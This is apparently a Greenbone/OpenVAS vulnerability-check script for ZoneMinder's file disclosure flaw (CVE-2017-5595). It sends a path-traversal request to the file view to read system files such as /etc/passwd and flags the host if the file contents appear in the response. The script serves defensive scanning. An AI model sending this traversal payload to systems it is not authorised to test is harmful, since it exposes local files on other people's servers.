CPE = "cpe:/a:zoneminder:zoneminder";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106564" );
	script_version( "2021-09-08T14:01:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-08 14:01:33 +0000 (Wed, 08 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-02-06 09:54:32 +0700 (Mon, 06 Feb 2017)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-02-10 02:59:00 +0000 (Fri, 10 Feb 2017)" );
	script_cve_id( "CVE-2017-5595", "CVE-2017-5367", "CVE-2017-5368" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "ZoneMinder Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_zoneminder_detect.sc", "os_detection.sc" );
	script_require_keys( "Host/runs_unixoide" );
	script_mandatory_keys( "zoneminder/installed" );
	script_tag( name: "summary", value: "ZoneMinder is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Tries to read the /etc/passwd file." );
	script_tag( name: "insight", value: "ZoneMinder is prone to multiple vulnerabilities:

  - File disclosure and inclusion vulnerability exists due to unfiltered user-input being passed to readfile() in
  views/file.php which allows an authenticated attacker to read local system files (e.g. /etc/passwd) in the
  context of the web server user (www-data). (CVE-2017-5595)

  - Multiple reflected XSS (CVE-2017-5367)

  - CSRF vulnerability since no CSRF protection exists across the entire web app. (CVE-2017-5368)" );
	script_tag( name: "impact", value: "An unauthenticated remote attacker may read arbitrary files." );
	script_tag( name: "solution", value: "Update to version 1.30.2 or later." );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2017/Feb/11" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/index.php?view=file&path=/../../../../../" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

